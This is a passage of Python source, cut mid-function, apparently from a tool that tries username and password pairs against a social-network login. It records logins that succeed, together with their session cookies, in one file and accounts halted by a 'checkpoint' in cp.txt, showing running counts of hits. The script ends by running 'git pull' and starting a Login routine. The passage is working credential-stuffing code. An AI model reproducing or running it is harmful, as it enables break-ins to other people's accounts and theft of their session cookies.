                        r.write(f"[✓] {kntl[0]}|{kntl[1]}|{coki}\n")
                    break
                elif "checkpoint" in ses.cookies.get_dict():
                    mmks = self.memek(f"{username}|{password}", "lqkwndpnkefneihfwnfuoeohni3e")
                    tree = Tree("")
                    tree.add(f"[[bold yellow]CHEK[/]] {mmks[0]}|{mmks[1]}")
                    prints(tree)
                    self.cp.append(mmks)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                        r.write(f"[×] {mmks[0]}|{mmks[1]}\n")
                    break
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"[ [bold red]spam[/] ] {str(self.lo)}/{len(self.id)} OK-[bold green]{len(self.ok)}[/] CP-[bold yellow]{len(self.cp)}[/]")
                prog.advance(des)
                time.sleep(5)
            #except Exception as e:print(e)
        self.lo+=1


os.system("clear")
os.system("git pull")
Login()
